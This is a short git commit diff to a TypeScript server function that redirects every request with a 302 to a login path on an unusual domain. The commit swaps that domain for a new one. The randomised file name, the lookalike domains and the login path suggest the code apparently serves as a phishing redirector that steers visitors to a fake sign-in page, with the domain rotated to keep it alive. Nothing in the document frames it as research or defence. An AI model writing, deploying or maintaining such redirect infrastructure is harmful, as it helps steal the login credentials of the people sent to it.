f16eb9d4b86ba111fdb15e91124871e777e484b7
Havillah1010 <agentpatrickjones@gmail.com>
2025-10-04 14:50:17 +0100

    Update potl4tch5vvc.ts

--- potl4tch5vvc.ts
+++ potl4tch5vvc.ts
@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://burhertvertacts.one/burkhe/login_/",
+      Location: "https://burhedftvertactsonline.info/burkhe/login_/",
     },
   });
 });
